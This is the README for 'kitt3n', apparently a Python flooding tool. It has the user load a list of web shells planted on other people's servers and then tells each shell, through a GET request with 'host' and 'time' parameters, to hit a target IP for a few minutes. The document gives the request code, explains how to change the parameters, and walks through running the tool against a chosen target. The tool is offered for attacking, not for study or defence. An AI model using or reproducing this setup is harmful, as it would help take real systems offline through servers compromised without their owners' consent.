kitt3n v1.0 - Kismet

Locate test.txt and add your shells/shell url path 

    Example: http://www.example.com/404.php
  
I've already set them to a certain param but you can edit them to your liking

    Example: http://www.example.com/404.php?host=1.1.1.1&time=120
  
If you would like to edit the params for the GET method you can do so by 

    Code: shellres = urllib2.urlopen(shell + "?host=" + target + "&time=" + str(time)).read()
    Example: http://www.example.com/shell.php
  
So lets say that the text input is ip instead of host ("?host=") and time is seconds ("&time=")
You would simpy replace host with ip and time with seconds in line 52.
  
    Code: shellres = urllib2.urlopen(shell + "?ip=" + target + "&seconds=" + str(time)).read()

    Note: If you use a list make sure all the shells have the same params!
  
Execute kitt3n

    Code: python kitt3n.py
  
Enter your file for your shells/shells url path

    Example: text.txt
  
Enter the IP of tagget

    Example: 127.0.0.1

Enter the time (recommend 180-240 seconds)

    Example: 240
  
Then it will set your input and ask you if you want to continue. Hit 'y'

    Code: y
  
Then sit back and let kitt3n do they work!

XMPP: kismet@r00-t.com
Twitter: temisK_
